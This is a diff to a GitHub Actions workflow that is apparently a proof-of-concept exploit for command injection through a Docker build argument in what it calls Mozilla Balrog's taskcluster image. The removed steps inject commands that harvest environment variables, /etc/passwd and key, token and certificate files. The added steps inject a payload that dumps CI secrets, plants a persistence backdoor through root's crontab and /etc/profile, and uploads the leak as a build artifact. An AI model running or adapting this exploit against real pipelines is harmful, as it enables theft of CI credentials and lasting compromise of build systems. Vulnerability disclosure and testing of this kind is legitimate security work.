@@ -1,10 +1,37 @@
-- name: Build + Leak Extract
-  run: |
-    mkdir -p output
-    docker build \
-      --build-arg PYTHON_VERSION="mkdir -p /output && echo '## USER & ENV' > /output/leaks.txt && id >> /output/leaks.txt && whoami >> /output/leaks.txt && env >> /output/leaks.txt && echo '## FILES & SECRETS' >> /output/leaks.txt && find / -type f \-name '*.env' -o -name '*token*' -o -name '*.key' -o -name '*.pem' -o -name '*.json' \ 2>/dev/null >> /output/leaks.txt && cat /etc/passwd >> /output/leaks.txt && echo '## GITHUB METADATA' >> /output/leaks.txt && ls -alhR /github | tee -a /output/leaks.txt && cat /github/workflow/event.json >> /output/leaks.txt 2>/dev/null || true" \
-      -t leak ./taskcluster/docker/python
+name: Mozilla Balrog RCE Leak PoC
 
-    cid=$(docker create leak)
-    docker cp "$cid:/output/leaks.txt" output/leaks.txt
-    docker rm "$cid"
+on: [push]
+
+jobs:
+  exploit:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Leak via Dockerfile Injection
+        run: |
+          PAYLOAD=$(cat <<'EOF'
+          echo "[*] Dumping CI ENV..." && printenv > /leaked.txt
+          echo "[*] Installing runtime backdoor..."
+          echo '#!/bin/sh' > /usr/local/bin/init.sh
+          echo 'echo "[*] Backdoor triggered" >> /runtime.log' >> /usr/local/bin/init.sh
+          echo 'printenv >> /runtime.log' >> /usr/local/bin/init.sh
+          chmod +x /usr/local/bin/init.sh
+          echo '@reboot /usr/local/bin/init.sh' >> /etc/crontabs/root
+          echo '/usr/local/bin/init.sh' >> /etc/profile
+          EOF
+          )
+
+          docker build \
+            --build-arg PYTHON_VERSION="$PAYLOAD" \
+            -t test-injected ./taskcluster/docker/python
+
+          docker run --rm test-injected cat /leaked.txt > output.txt
+
+      - name: Upload Leak
+        uses: actions/upload-artifact@v4
+        with:
+          name: simulated-leak
+          path: output.txt
